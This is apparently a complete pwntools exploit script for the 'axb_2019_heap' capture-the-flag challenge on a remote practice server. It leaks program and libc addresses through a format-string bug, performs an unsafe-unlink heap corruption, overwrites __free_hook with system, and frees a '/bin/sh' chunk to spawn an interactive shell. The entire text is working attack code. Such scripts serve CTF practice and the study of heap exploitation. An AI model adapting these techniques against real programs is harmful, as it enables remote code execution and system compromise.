from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('axb_2019_heap')
io = remote('node4.buuoj.cn', 28045)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('axb_2019_heap')


def add(index, size, content):
    io.sendlineafter('>> ', '1')
    io.sendlineafter('Enter the index you want to create (0-10):', str(index))
    io.sendlineafter('Enter a size:\n', str(size))
    io.sendafter('Enter the content: \n', content)


def delete(index):
    io.sendlineafter('>> ', '2')
    io.sendlineafter('Enter an index:', str(index))


def edit(index, content):
    io.sendlineafter('>> ', '4')
    io.sendlineafter('Enter an index:', str(index))
    io.sendafter('Enter the content: \n', content)


def leak_elf_libc():
    global elf_base, libc_base
    io.sendlineafter('Enter your name: ', b'%14$p%15$p')
    io.recvuntil('Hello, ')
    elf_base = int(io.recvn(14), 16) - 0x1200
    libc_base = int(io.recvn(14), 16) - libc.sym['__libc_start_main'] - 240
    log.success('elf_base: ' + hex(elf_base))
    log.success('libc_base: ' + hex(libc_base))
    
    
def unlink():
    note = elf_base + elf.sym['note']
    add(0, 0x88, '0\n')
    add(1, 0x88, '1\n')
    fd, bk = note - 0x18, note - 0x10
    payload = p64(0) + p64(0x81) + p64(fd) + p64(bk) + cyclic(0x60) + p64(0x80) + p8(0x90)
    edit(0, payload)
    delete(1)


def pwn():
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
    payload = cyclic(0x18) + p64(__free_hook) + p64(8) + p64(bin_sh) + b'\n'
    edit(0, payload)
    edit(0, p64(system) + b'\n')
    # gdb.attach(io)
    # pause()
    delete(1)
    io.interactive()


if __name__ == '__main__':
    leak_elf_libc()
    unlink()
    pwn()
